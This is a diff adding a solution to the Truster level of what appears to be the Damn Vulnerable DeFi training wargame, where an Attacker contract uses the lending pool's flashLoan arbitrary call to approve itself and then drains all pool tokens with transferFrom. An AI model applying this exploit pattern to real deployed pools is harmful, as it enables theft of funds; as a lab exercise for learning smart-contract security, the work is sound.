@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {IERC20} from "forge-std/interfaces/IERC20.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +52,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Craft malicious calldata        
+        Attacker atracker = new Attacker(recovery, pool, address(token));
     }
 
     /**
@@ -65,4 +67,16 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+contract Attacker {
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
+
+    constructor(address _recovery , TrusterLenderPool _pool, address _token) {
+        bytes memory data = abi.encodeCall(IERC20.approve,(address(this),TOKENS_IN_POOL));
+       _pool.flashLoan(0, address(0), _token, data);
+        IERC20(_token).transferFrom(address(_pool), _recovery, TOKENS_IN_POOL);
+
+    }
+    
 }
